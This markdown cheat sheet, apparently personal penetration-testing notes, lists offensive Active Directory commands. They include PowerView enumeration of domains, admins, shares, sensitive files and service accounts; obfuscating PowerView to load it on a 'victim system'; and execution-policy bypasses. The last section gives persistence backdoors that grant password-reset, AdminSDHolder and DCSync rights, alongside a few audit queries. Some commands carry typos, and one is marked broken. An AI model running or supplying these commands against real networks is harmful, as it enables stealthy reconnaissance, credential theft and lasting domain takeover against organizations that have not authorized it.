# Active Direcroty Enumeration CMDs
<p>PS = PowerShell</p>
<p>PV = PowerView</p>
<p>FP = Find-PSServiceAccounts</p>

**Active Directory PS** Import Modules - Windows 10
```powershell
Import-Module ServerManager
Add-WindowsFeature RSAT-AD-PowerShell
```
**PowerView** Import Modules - Windows 10

_Pre Install Steps_ on Dev System
```powershell
get-executionpolicy -List 							# Shows current executionpolicy
set-executionpolicy -ExecutionPolicy Unrestriced 	# Allows .ps1 script to be imported and/or executed
Import-Module Invoke-Obfusctation.ps1
Out-obfuscationTokenCommand -Path \Path\to\PowerView.ps1 |Out-File $ObfuscatedPowerViewFilename
```

_Obfuscated PowerView_ Import on Victim System
```powershell
Import-Module $ObfuscatedPowerViewFilename
```

**Potential Bypass for PowerView Loading**
```powershell
cd c:\AD\Tool\		# Probably need to create this dir or something similar
. .\PowerView.ps1	# I wonder if it's the '.' that provides the path to bypass?
```

## Domain Enumeration

**Get Current Domain:NonPS*::*
```powershell
$ADClass = [System.DirectoryServices.ActiveDirectory.Domain]

$ADClass::GetCurrentDomain()
```

**Current Domain:PV::** `Get-NetDomain`

**Current Domain:PS::** `Get-ADDomain`

**Domain Controllers::PS:** `Get-ADDomainController`

**Domain Controllers::PV:** `Get-NetDomainController`

**Domain Controllers for Another Domain::PV:** `Get-ADDomainController -Domain $domain.object`

**Domain Controllers for Another Domain::PS:** `Get-ADDomainController -DomainName $domian.object -Discover`

**Object of Another Domain:PV::** `Get-NetDomain -Domain $domain.object`

**Object of Another Domain:PS::** `Get-ADDomain -Identity $domain.object`

**Domain SID for current Domain:PV::** `(Get-ADDomain).DomainSID`

**Domain Policy for Current Domain:PV::** `(Get-DomainPolicy)."system access"`

**Domain Policy for Another Domain:PV::** `(Get-DomainPolicy -Domain $domian.object)."system access"`

**Shares in current domian:PV::** `Invoke-ShareFinder -Verbose`

**Find Sensitive Files on Computers in Domain:PV::** `Invoke-FileFinder -Verbose`

**Domain FileServers:PV::** `Get-NetFileServer`


## User Hunting
> Try and get an idea where users (specific) users are logged in.

**List Property Definitions:PS** 
```powershell
Get-ADUser -Filter * -Properties * | select -First 1 | Get-Member -MemberType *Property
```

 _Example_
 ```text
 Name                               MemberType            Definition                                                                                                                         
----                               ----------            ----------                                                                                                                         
Item                               ParameterizedProperty Microsoft.ActiveDirectory.Management.ADPropertyValueCollection Item(string propertyName) {get;}                                    
AccountExpirationDate              Property              System.DateTime AccountExpirationDate {get;set;}                                                                                   
accountExpires                     Property              System.Int64 accountExpires {get;set;}
```

**List of User Properties:PV::** `Get-UserProperty`

**List Users of X Group:PV::** `get-NetGroupMember -GroupName 'Domain Admins'`

**List Users where Description contains "built":FP**
```poweshell
finD-USerFiElD -SeARchfiEld Description -sEaRCHtErm "built"
```

**List Users where Description contains "built":PS**
```powershell
Get-ADUser -Filter 'Description -like "*built*"' -Properties Description | select SamAccountName,Description
```

**Account Bad Password Count & Logon Count * Pwd Last Set:PS::**

```powershell
Get-ADUser -Filter * -Properties SamAccountName,badPwdCount |select SamAccountName,BadPwdCount

Get-ADUser -Filter * -Properties SamAccountName,logonCount |Select-Object SamAccountName,LogonCount

Get-ADUser -Filter * -Properties PasswordLastSet |select SamAccountName,PasswordLastSet
```

*Identify machines inside the domain OR do reverse lookups via LDAP*

**PS::Hostnames:** `get-adcomputer –filter * -Properties ipv4address | where {$_.IPV4address} | select name,ipv4address`

**PS::IP Addresses:** `get-adcomputer -filter {ipv4address -eq '*IP*'} -Properties Lastlogondate,passwordlastset,ipv4address` <-- Currently Broken

**Domain Group Policies::PV:** `Get-NetGPO | select displayname,name,whenchanged`

**User Group Access Rights to Particular Group:** `Get-NetGroupMember 'Domain Admins' -Recurse`

**Get Domain Admins** & then tokenize all displaynames to requery for all users that match that patter
```powershell
Get-NetGroupMember -GroupName 'Domain Admins' -FullData | %{ $a=$_.displayname.split('')[0..1] -join ' '; Get-NetUser -Filter "(displayname=*$a*)" } | Select-Object -Property displayname,samaccountname
```
**Get list of all Forest Users:** `RetrieveAllUsersFromAD.ps1`

https://gallery.technet.microsoft.com/scriptcenter/Retrieve-All-Users-from-AD-b76e3443


### SPN Scanning

**Find-PSServiceAccounts** from github.com/PyroTek3/PowerShell-AD-Recon `Find-PSServiceAccounts`
> Disguised with _Invoke-Obfuscate_ via the 'default' means above, kinda makes it unusable. 
> Howerver, it doesn't look like internal controls stop this from just being sent into the envirnment.

**SPN with PS:** `Get-ADComputer -filter {ServicePrincipalName -Like "*SPN*" } -Properties OperatingSystem,OperatingSystemVersion,OperatingSystemServicePack,PasswordLastSet,LastLogonDate,ServicePrincipalName,TrustedForDelegation,TrustedtoAuthForDelegation`

### AD Schema

`Invoke-UserHunter -Stealth -ShowAll`

### Admin required CMDs

`get-netlocalgroup -computername $DomainController` 

**Actively Logged on Users:PV**
`get-netloggedon -computername $systemName` #requires Local Admin

**Locally Logged Users on Computer:PV**
`get-loggedonlocal -ComputerName $SystemName

**Lasted Logged User:PV**
`get-LastLoggedOn -ComputerName $SyetemName

### ACLs
**AD ACLs for given user:** `Get-ObjectACL -ResolveGUIDs -SamAccountName SamAccountName`

**Persitance**
*Add backdoored ACL.  Grant SamAccountName1 right to reset the password for SamAccountName2*
```PowerShell
Add-ObjectACL -TargetSamAccountName SamAccountName2 -PrincipalSamAccountName
SamAccountName1 -Rights ResetPassword
```

*Backdoor permissions for AdminSDHolder*
```powershell
Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName SamAccountName1 -Verbose -Rights All
```
*Audit ACL rights for AdminSDHolder*
```powershell
Get-ObjectAcl -ADSprefix 'CN=AdminSDHolder,CN=System' -ResolveGUIDs | ?{$_.IdentityReference -match 'SamAccountName1'}
```

*Backdoor rights for DCSync*
```powershell
Add-ObjectACL -TargetDistinguishedName "dc=els,dc=local" -PrincipalSamAccountName SamAccountName1 -Rights DCSync
```

*Audit users who have DCSync rights*
```powershell
Get-ObjectACL -DistinguishedName "dc=els,dc=local" -ResolveGUIDs | ? {($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match'GenericAll') }
```

*Audit GPO Permission*
```powershell
Get-NetGPO | ForEach-Object {Get-ObjectAcl -ResolveGUIDs -Name $_.name} | WhereObject {$_.ActiveDirectoryRights -match 'WriteProperty'}
```

*Scan for non-standard ACL permission sets*
```powershell
Invoke-ACLScanner
```
### Domain Trusts
